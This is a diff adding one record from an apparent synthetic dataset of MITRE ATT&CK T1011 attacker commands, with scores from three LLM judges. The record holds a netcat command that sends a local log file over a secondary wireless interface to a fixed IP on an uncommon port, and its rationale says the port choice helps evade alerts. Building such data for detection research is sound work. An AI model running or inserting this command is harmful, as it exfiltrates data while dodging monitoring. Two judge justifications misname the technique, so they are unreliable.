@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "iwconfig wlan2 >/dev/null 2>&1 && nc -w 3 -s \"$(ip -4 addr show wlan2 | awk '/inet /{print $2}' | cut -d/ -f1)\" 10.55.88.6 49321 < /home/user/.local/share/usage.log",
+  "explanation": "Sends data over a non-primary wireless interface (wlan2) using TCP to a high, uncommon port, consistent with T1011 by leveraging a separate wireless medium for exfiltration.",
+  "rationale_steps": [
+    "Confirm wlan2 status using iwconfig without changing configuration.",
+    "Bind the connection to wlan2\u2019s IP to ensure use of the alternate medium.",
+    "Stream the file over a non-standard TCP port to minimize baseline alerts."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-621a2eda-fc2d1114",
+  "source_prompt_hash": "621a2eda",
+  "timestamp_utc": "2025-09-30T08:26:15.681023Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper command chaining (&&), correct redirection (>/dev/null 2>&1), valid command substitution ($()), appropriate quoting, and proper use of pipe (<) for input redirection.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command does exfiltrate data over a network connection, it doesn't align with T1011 (Exfiltration Over Other Network Medium) rather than T1011 (Establish Accounts) as described in the technique description, showing a mismatch between the command and the claimed technique.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T10:05:19.677961Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, valid flags, proper command separators, and correct command substitutions.",
+        "semantic_score": 0,
+        "semantic_justification": "The command performs data exfiltration, which is completely unrelated to the T1011 'Establish Accounts' technique, despite the provided explanation's attempt to link them.",
+        "combined_score": 2.5,
+        "confidence": 1,
+        "timestamp": "2025-10-02T10:05:27.152486Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed with balanced quoting, valid pipes/redirections, and legitimate nc/ip/awk options and syntax.",
+        "semantic_score": 4,
+        "semantic_justification": "It plausibly exfiltrates the file via TCP by binding to wlan2\u2019s IP and sending to 10.55.88.6:49321, though -s does not strictly force egress over wlan2 and iwconfig does not ensure the interface is up.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-02T10:05:57.994333Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 2.333,
+    "llm_average_score": 3.667,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
